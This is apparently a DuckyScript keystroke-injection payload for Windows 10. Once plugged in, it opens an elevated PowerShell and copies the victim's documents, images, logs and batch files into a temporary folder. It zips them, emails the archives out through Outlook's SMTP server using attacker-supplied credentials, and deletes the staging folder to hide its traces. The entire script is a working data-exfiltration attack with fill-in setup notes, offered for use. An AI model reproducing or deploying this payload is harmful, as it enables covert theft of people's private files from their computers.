REM Title: Search & Email Exfiltration (old)
REM Author: @beigeworm
REM Description: Uses Powershell to gather various filetypes and send them via Email.
REM Target: Windows 10

REM *REQUIREMENTS*
REM you will need a Microsoft Outlook Email address for this to work.

REM *SETUP*
REM replace EMAIL_HERE and PASSWORD_HERE. (check entire script)

REM =============================================================================

REM some setup for dukie script
LOCALE US
DEFAULT_DELAY 100

DELAY 1000
GUI r
DELAY 200
STRING notepad
ENTER
DELAY 1000
STRING $From = "EMAIL_HERE"
ENTER
STRING $To = "EMAIL_HERE"
ENTER
STRING $Attachment = "C:/Users/Public/Temp/a.zip"
ENTER
STRING $Subject = "IP Info"
ENTER
STRING $Body = "yourdetails"
ENTER
STRING $SMTPServer = "smtp.outlook.com"
ENTER
STRING $SMTPPort = "587"
ENTER
STRING Send-MailMessage -From $From -to $To -Subject $Subject `
ENTER
STRING -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
ENTER
STRING -Credential (Get-Credential -Credential "EMAIL_HERE") -Attachments $Attachment
DELAY 250
CONTROL a
DELAY 250
CONTROL c
DELAY 250
ALT F4
DELAY 250
ALT n
DELAY 2000
GUI r 
DELAY 500 
STRING powershell 
CONTROL SHIFT ENTER
DELAY 1000
ALT y
DELAY 2500
STRING [system.io.directory]::CreateDirectory("C:/Users/Public/Temp")
ENTER
DELAY 500
STRING copy $env:USERPROFILE/Desktop/*.lnk C:/Users/Public/Temp
ENTER
DELAY 3000
STRING copy C:/Users/*/*/*/*/*/*.txt C:/Users/Public/Temp
ENTER
DELAY 5000
STRING copy C:/Users/*/*/*/*/*/*.pdf C:/Users/Public/Temp
ENTER
DELAY 5000
STRING copy C:/Users/*/*/*/*/*/*.log C:/Users/Public/Temp
ENTER
DELAY 3000
STRING copy C:/Users/*/*/*/*/*.stl C:/Users/Public/Temp
ENTER
DELAY 3000
STRING Compress-Archive -Path "C:/Users/Public/Temp" -DestinationPath "C:/Users/Public/Temp/a.zip"
ENTER
CONTROL v
ENTER
DELAY 1500
STRING PASSWORD_HERE
ENTER
DELAY 20000
STRING rm C:/Users/Public/Temp
ENTER
STRING a
ENTER
DELAY 1000
STRING [system.io.directory]::CreateDirectory("C:/Users/Public/Temp")
ENTER
STRING copy C:/Users/*/*/*/*/*/*.ico C:/Users/Public/Temp
ENTER
DELAY 3000
STRING copy C:/Users/*/*/*/*/*.bat C:/Users/Public/Temp
ENTER
DELAY 3000
STRING Compress-Archive -Path "C:/Users/Public/Temp" -DestinationPath "C:/Users/Public/Temp/a.zip"
ENTER
CONTROL v
ENTER
DELAY 1500
STRING PASSWORD_HERE
ENTER
DELAY 20000
STRING rm C:/Users/Public/Temp
ENTER
STRING a
ENTER
DELAY 1000
STRING [system.io.directory]::CreateDirectory("C:/Users/Public/Temp")
ENTER
DELAY 2000
STRING copy C:/Users/*/*/*/*/*/*.png C:/Users/Public/Temp
ENTER
DELAY 5000
STRING copy C:/Users/*/*/*/*/*/*.jpg C:/Users/Public/Temp
ENTER
DELAY 5000
STRING copy C:/Users/*/*/*/*/*/*.bmp C:/Users/Public/Temp
ENTER
DELAY 5000
STRING Compress-Archive -Path "C:/Users/Public/Temp" -DestinationPath "C:/Users/Public/Temp/a.zip"
ENTER
DELAY 4000
CONTROL v
ENTER
DELAY 1500
STRING PASSWORD_HERE
ENTER
DELAY 20000
STRING rm C:/Users/Public/Temp
ENTER
STRING a
ENTER
DELAY 2000
STRING exit
ENTER


